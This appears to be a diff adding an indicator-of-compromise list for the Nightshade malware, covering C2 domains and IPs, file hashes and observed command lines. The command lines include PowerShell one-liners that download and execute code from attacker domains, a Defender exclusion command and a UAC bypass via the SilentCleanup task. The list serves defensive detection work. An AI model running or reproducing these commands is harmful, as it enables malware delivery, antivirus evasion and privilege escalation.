@@ -1,0 +1,108 @@
+Domain:
+
+bioomx[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+boiksal[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+bkkil[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+biosefjk[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+bioakw[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+bikbal[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+bilaskf[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+bliokdf[.]com - ClickFix/C2 for second (PowerShell) and third stage .NET loader
+tdbfvgwe456yt[.]com - Nightshade Python variant C2
+programsbookss[.]com - Nightshade C++ variant C2
+
+Url:
+
+http://www.ip-api[.]com/line/?fields=147457 - External IP lookup URL for Nightshade C++ variant
+http://www.ip-api[.]com/line/?fields=147505 - External IP lookup URL for Nightshade C++ variant
+http://www.ip-api[.]com/line/?fields=16385 - External IP lookup URL for Nightshade Python variant
+
+IP:
+
+185.208.158.250 - Nightshade C++ variant C2
+104.225.129.171 - Nightshade C++ variant C2
+34.72.90.40 - Nightshade C++ variant C2
+94.141.122.164 - Nightshade C++ variant C2
+64.52.80.82 - Nightshade C++ variant C2
+102.135.95.102 - Nightshade C++ variant C2
+178.17.57.102 - Nightshade C++ variant C2
+185.149.146.118 - Nightshade C++ variant C2
+185.149.146.1 - Nightshade C++ variant C2
+180.178.189.17 - Nightshade C++ variant C2
+195.201.108.189 - Nightshade C++ variant C2
+77.238.241.203 - Nightshade C++ variant C2
+5.35.44.176 - Nightshade C++ variant C2
+180.178.122.131 - Nightshade C++ variant C2
+91.202.233.250 - Nightshade Python variant C2
+45.61.136.81 - Nightshade Python variant C2
+45.11.180.174 - Nightshade Python variant C2
+91.202.233.132 - Nightshade Python variant C2
+107.158.128.90 - Nightshade Python variant C2
+107.158.128.45 - Nightshade Python variant C2
+170.130.165.28 - Nightshade Python variant C2
+91.202.233.251 - Nightshade Python variant C2
+79.132.130.142 - Nightshade Python variant C2
+173.232.146.90 - Nightshade Python variant C2
+
+File:
+
+8940944e4abc600b283703876def0403160a5109abdbcb9e97c488dc3cc59b94 - Nightshade C++ variant (updater.exe)
+39b40746de01af66c0e5ce5888df4c42e474adcdb4301275b1474423d7a0ff1f - Nightshade C++ variant (CCleaner_Setup.exe)
+f2ff4cbcd6d015af20e4e858b0f216c077ec6d146d3b2e0cbe68b56b3db7a0be - Nightshade C++ variant (Everything-Setup.exe)
+0c08b5f3c24841d5fe02ddebdcf4707a75c790916c3ad4c769108241ddf999e4 - Nightshade C++ variant
+c4fd98db8d8181d949ee4ff47991dda70f73b47c72104aa519150223dd8d3588 - Nightshade C++ variant
+cf0c7e0f3c3ea60da7bfe779f09d32b441d5089c905a5d905253e2f4b2b202fd - Nightshade C++ variant
+04a1852aed5734d8aaf97730a7231272f103605a4f83ea8413abe6f8169aee4c - Nightshade C++ variant
+0c08b5f3c24841d5fe02ddebdcf4707a75c790916c3ad4c769108241ddf999e4 - Nightshade C++ variant
+0fd7eb57f5f9d817dd497c1ce3be0791f5e798077f8dc2c3a4e2b2b0b0bdc2c6 - Nightshade C++ variant
+1178fa21928e5aac0f320e18bfb15603e00d3b8874719f4e74dd4f49db6dc5a8 - Nightshade C++ variant
+1ff6ee23b4cd9ac90ee569067b9e649c76dafac234761706724ae0c1943e4a75 - Nightshade C++ variant
+26a5e18d6ac86a865250452528664d4cde74187d741fcf98370efb34d4219490 - Nightshade C++ variant
+2fcb76dfdfcd390658bbc032faafef607804d5d4a2f1c0005f274ab2e06d8af4 - Nightshade C++ variant
+3dd877835c04fde3f2d14ce96f23a1c00002fefa9d731e8c4ce3b656aac90063 - Nightshade C++ variant
+420f13538c0c2620eba396e96afdf36430b2618d7d215e96c81444379ab8a7bc - Nightshade C++ variant
+5a741df3e4a61b8632f62109a65afc0f297f4ed03cd7e208ffd2ea5e2badf318 - Nightshade C++ variant
+
+e77bc95772ae84e5ecf68c928059cab3e305f92b1518d0ec3f8a7eb6eb728503 - PowerShell that downloads/executes third stage .NET loader
+24934295a5824ef8ec8df1df9ee5bc719bb98e9b6b55b2cbbb02498782762cc5 - PowerShell that downloads/executes third stage .NET loader
+0e9d984f980ceffb846946a8926e1d69abf2d07a6b710b8f8c802026ba3bbdb4 - PowerShell that downloads/executes third stage .NET loader
+05a4f648099d0b35d6eb4662266b1046d4691bb8e739a4fd4e4e55e69774ef1f - PowerShell that downloads/executes third stage .NET loader
+21497a0eb89f321f971b4346880b43b342df131c431788cff4685c5a5a71b53e - PowerShell that downloads/executes third stage .NET loader
+
+cbee972115b129ed3ce366217321a6f431ab86d9bf61c90ef7d224f1004a672c - Third stage .NET loader w/ UAC Prompt Bombing
+375229df144b3fb0d0560d90b06aa7fe34825886069653a088fa4071476cf63e - Third stage .NET loader w/ UAC Bypass
+
+ce2ad8b6d76ba03c96d9248ac3d22590801e00611244c1942875adf52c154971 - Backdoor'd Advanced IP Scanner dropping Nightshade Python variant
+7ce399ae92c3e79a25e9013b2c81fe0add119bda0a65336d1e5c231654db01a5 - Backdoor'd Advanced IP Scanner dropping Nightshade Python variant
+05d2d06143d363c1e41546f14c1d99b082402460ba4e8598667614de996d2fbc - Backdoor'd Advanced IP Scanner dropping Nightshade Python variant
+94dc0f696a46f3c225b0aa741fbd3b8997a92126d66d7bc7c9dd8097af0de52a - Nightshade Python variant
+58d54e2454be3e4e9a8ea86a3f299a7a60529bc12d28394c5bdf8f858400ff7b - Nightshade Python variant
+53775af67e9df206ed3f9c0a3756dbbc4968a77b1df164e9baddb51e61ac82df - Nightshade Python variant
+6d62210addb8268d0bd3e6ef0400d54c84e550ccad49f5867fdc51edc0c1db2c - Nightshade Python variant
+282fa3476294e2b57aa9a8ab4bc1cc00f334197298e4afb2aae812b77e755207 - Nightshade Python variant
+a2feb262a667de704e5e08a8a705c69bbcc806e0d52f0f8e3f081a6aa6c8d7b4 - Nightshade Python variant
+85b4d29f2830a3be3a0f51fbe358bea1a35d2a8aaa6a24f5cc1f2e5d2769716e - Nightshade Python variant
+
+Command Line:
+
+"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -w h -ep b -c "iex (iwr boiksal[.]com/upd -useb).Content"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command " try { if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) { Add-MpPreference -ExclusionPath 'C:\\Users\\<REDACTED>' -Force; Add-MpPreference -ExclusionPath 'C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\tibKZb\\updater.exe' -Force; Add-MpPreference -ExclusionProcess 'C:\\Users\\<REDACTED>\\AppData\\Local\\Temp\\tibKZb\\updater.exe' -Force; } } catch { } "
+powershell Start-Sleep -Seconds 3; Remove-Item -Path <REDACTED> -Force
+"C:\Windows\system32\cmd.exe" /c start /min powershell -w hidden -c "$p=$env:APPDATA+'\a\f.ps1'; mkdir (Split-Path $p) -Force; ni (Split-Path $p)-ea 0|Out-Null; iwr hxxp://bioomx[.]com/upd -UseBasicPar -o $p; & powershell -w hidden -ep bypass -f $p"
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -ep bypass -f C:\Users\<REDACTED\AppData\Roaming\a\f.ps1
+"C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Python\3.13.5\pythonw.exe" C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Python\3.13.5\ping_msdn.py
+"C:\Windows\System32\rundll32.exe" "C:\Windows\System32\shell32.dll" #61
+"C:\Program Files\Mozilla Firefox\firefox.exe" -no-deelevate
+"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"  -no-deelevate
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\Google\Chrome\Application\chrome.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\Microsoft\Edge\Application\msedge.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+"C:\Users\<REDACTED>\AppData\Local\BraveSoftware\Brave-Browser\Application\brave.exe" --mute-audio --do-not-de-elevate
+reg add "HKCU\Environment" /v windir /t REG_SZ /d "<REDACTED> /1" /f
+schtasks /Run /i /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
+reg delete "HKCU\Environment" /v windir /f
